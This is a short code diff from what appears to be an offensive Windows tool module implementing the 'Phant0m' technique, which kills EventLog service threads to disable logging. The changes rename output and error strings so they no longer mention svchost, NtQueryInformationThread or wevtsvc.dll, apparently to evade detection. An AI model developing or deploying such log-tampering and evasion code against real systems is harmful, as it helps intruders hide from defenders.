@@ -42,7 +42,7 @@ func evtPhantom() structs.CommandResult {
 
 	var sb strings.Builder
 	sb.WriteString("[*] Phant0m — Kill EventLog Service Threads\n")
-	sb.WriteString("[*] Technique: Enumerate svchost threads → NtQueryInformationThread → kill wevtsvc.dll threads\n\n")
+	sb.WriteString("[*] Technique: Enumerate service threads → identify target module → terminate threads\n\n")
 
 	// Step 1: Find EventLog service PID
 	scm, err := mgr.Connect()
@@ -157,7 +157,7 @@ func getThreadStartAddress(threadID uint32) (uintptr, error) {
 		0,
 	)
 	if status != 0 {
-		return 0, fmt.Errorf("NtQueryInformationThread returned 0x%X", status)
+		return 0, fmt.Errorf("thread info query returned 0x%X", status)
 	}
 
 	return startAddr, nil
